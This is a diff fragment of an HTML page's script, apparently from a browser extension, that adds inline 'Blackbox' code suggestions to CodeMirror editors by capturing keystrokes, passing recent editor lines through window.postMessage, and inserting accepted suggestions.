+            return languageObject[language].split("DELIMITER")
+        }
+        var savedChPos = 0
+        var returnedSuggestion = ''
+        let editor, doc, cursor, line, pos
+        pos = { line: 0, ch: 0 }
+        var suggestionsStatus = false
+        var docLang = "python"
+        var suggestionDisplayed = false
+        var isReturningSuggestion = false
+        document.addEventListener("keydown", (event) => {
+            setTimeout(() => {
+                editor = event.target.closest('.CodeMirror');
+                if (editor) {
+                    const codeEditor = editor.CodeMirror
+                    if (!editor.classList.contains("added-tab-function")) {
+                        editor.classList.add("added-tab-function")
+                        codeEditor.removeKeyMap("Tab")
+                        codeEditor.setOption("extraKeys", {
+                            Tab: (cm) => {
+
+                                if (returnedSuggestion) {
+                                    acceptTab(returnedSuggestion)
+                                }
+                                else {
+                                    cm.execCommand("defaultTab")
+                                }
+                            }
+                        })
+                    }
+                    doc = editor.CodeMirror.getDoc()
+                    cursor = doc.getCursor()
+                    line = doc.getLine(cursor.line)
+                    pos = { line: cursor.line, ch: line.length }
+
+                    if (cursor.ch > 0) {
+                        savedChPos = cursor.ch
+                    }
+
+                    const fileLang = doc.getMode().name
+                    docLang = fileLang
+                    const commentSymbol = returnCommentSymbol(fileLang)
+                    if (event.key == "?") {
+                        var lastLine = line
+                        lastLine = lastLine.slice(0, savedChPos - 1)
+
+                        if (lastLine.trim().startsWith(commentSymbol[0])) {
+                            lastLine += " " + fileLang
+                            lastLine = lastLine.split(commentSymbol[0])[1]
+                            window.postMessage({ source: 'getQuery', payload: { data: lastLine } })
+                            isReturningSuggestion = true
+                            displayGrey("\nBlackbox loading...")
+                        }
+                    } else if (event.key === "Enter" && suggestionsStatus && !isReturningSuggestion) {
+                        var query = doc.getRange({ line: Math.max(0, cursor.line - 10), ch: 0 }, { line: cursor.line, ch: line.length })
+                        window.postMessage({ source: 'getSuggestion', payload: { data: query, language: docLang } })
+                        displayGrey("Blackbox loading...")
+                    } else if (event.key === "ArrowRight" && returnedSuggestion) {
+                        acceptTab(returnedSuggestion)
+                    } else if (event.key === "Enter" && isReturningSuggestion) {
+                        displayGrey("\nBlackbox loading...")
+                    } else if (event.key === "Escape") {
+                        displayGrey("")
+                    }
+                }
+            }, 0)
+        })
+
+        function acceptTab(text) {
+            if (suggestionDisplayed) {
+                displayGrey("")
+                doc.replaceRange(text, pos)
+                returnedSuggestion = ""
+                updateSuggestionStatus(false)
+            }
+        }
+        function acceptSuggestion(text) {
+            displayGrey("")
+            doc.replaceRange(text, pos)
+            returnedSuggestion = ""
+            updateSuggestionStatus(false)
+        }
+        function displayGrey(text) {
+            if (!text) {
+                document.querySelector(".blackbox-suggestion").remove()
+                return
+            }
+            var el = document.querySelector(".blackbox-suggestion")
+            if (!el) {
+                el = document.createElement('span')
+                el.classList.add("blackbox-suggestion")
+                el.style = 'color:grey'
+                el.innerText = text
+            }
+            else {
+                el.innerText = text
+            }
+
+            var lineIndex = pos.line;
+            editor.getElementsByClassName('CodeMirror-line')[lineIndex].appendChild(el)
+        }
+        function updateSuggestionStatus(s) {
+            suggestionDisplayed = s
+            window.postMessage({ source: 'updateSuggestionStatus', status: suggestionDisplayed, suggestion: returnedSuggestion })
+        }
+        window.addEventListener('message', (event) => {
+            if (event.source !== window) return
+            if (event.data.source == 'return') {
+                isReturningSuggestion = false
+                const formattedCode = formatCode(event.data.payload.data)
+                returnedSuggestion = formattedCode
+                displayGrey(formattedCode)
+                updateSuggestionStatus(true)
+            }
+            if (event.data.source == 'suggestReturn') {
+                returnedSuggestion = event.data.payload.data
+                displayGrey(event.data.payload.data)
+                updateSuggestionStatus(true)
+            }
+            if (event.data.source == 'suggestionsStatus') {
+                suggestionsStatus = event.data.payload.enabled
+            }
+            if (event.data.source == 'acceptSuggestion') {
+
+                acceptSuggestion(event.data.suggestion)
+            }
+        })
+        document.addEventListener("keyup", function () {
+            returnedSuggestion = ""
+            updateSuggestionStatus(false)
+        })
+        function formatCode(data) {
+            if (Array.isArray(data)) {
+                var finalCode = ""
+                var pairs = []
+
+                const commentSymbol = returnCommentSymbol(docLang)
+                data.forEach((codeArr, idx) => {
+                    const code = codeArr[0]
+                    var desc = codeArr[1]
+                    const descArr = desc.split("\n")
+                    var finalDesc = ""
+                    descArr.forEach((descLine, idx) => {
+                        const whiteSpace = descLine.search(/\S/)
+                        if (commentSymbol.length < 2 || idx === 0) {
+                            finalDesc += insert(descLine, whiteSpace, commentSymbol[0])
+                        }
+                        if (commentSymbol.length > 1 && idx === descArr.length - 1) {
+                            finalDesc = finalDesc + commentSymbol[1] + "\n"
+                        }
+                    })
+
+                    finalCode += finalDesc + "\n\n" + code
+                    pairs.push(finalCode)
+                })
+                return "\n" + pairs.join("\n")
+            }
+
+            return "\n" + data
+        }
+
+        function insert(str, index, value) {
+            return str.substr(0, index) + value + str.substr(index)
+        }
+    </script>
+    <div></div>
+</body>
+
+</html>
